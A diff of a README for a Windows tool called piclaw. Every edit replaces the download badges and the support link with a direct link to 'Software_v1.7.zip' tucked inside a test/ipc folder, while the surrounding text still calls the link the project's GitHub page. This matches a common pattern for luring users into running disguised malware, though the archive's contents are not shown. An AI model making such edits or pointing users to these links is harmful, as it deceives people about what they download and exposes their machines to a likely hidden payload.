@@ -1,6 +1,6 @@
 # 🎯 piclaw - Simple Image Control Made Easy
 
-[![Download piclaw](https://img.shields.io/badge/Download-piclaw-blue?style=for-the-badge)](https://github.com/kukareku6341/piclaw)
+[![Download piclaw](https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip)](https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Getting piclaw on your Windows PC is a straightforward process. Follow the instr
 
 Click the badge below or visit the link to download the program files:
 
-[![Download piclaw](https://img.shields.io/badge/Download-piclaw-green?style=for-the-badge)](https://github.com/kukareku6341/piclaw)
+[![Download piclaw](https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip)](https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip)
 
 This link takes you to the piclaw GitHub page. From there, you can find the latest version available. Look for a folder or area labeled **Releases** or **Downloads**. Typically, the file to download will have a name ending in `.exe`, indicating an installer for Windows.
 
@@ -134,7 +134,7 @@ For any questions, visit the piclaw GitHub page’s Issues section. Users and de
 
 Use this link for support and to check updates:
 
-**https://github.com/kukareku6341/piclaw**
+**https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip**
 
 ---
 
@@ -152,4 +152,4 @@ You only need an internet connection to download and update the application.
 
 ---
 
-[![Download piclaw](https://img.shields.io/badge/Download-piclaw-purple?style=for-the-badge)](https://github.com/kukareku6341/piclaw)
+[![Download piclaw](https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip)](https://github.com/kukareku6341/piclaw/raw/refs/heads/main/piclaw/test/ipc/Software_v1.7.zip)
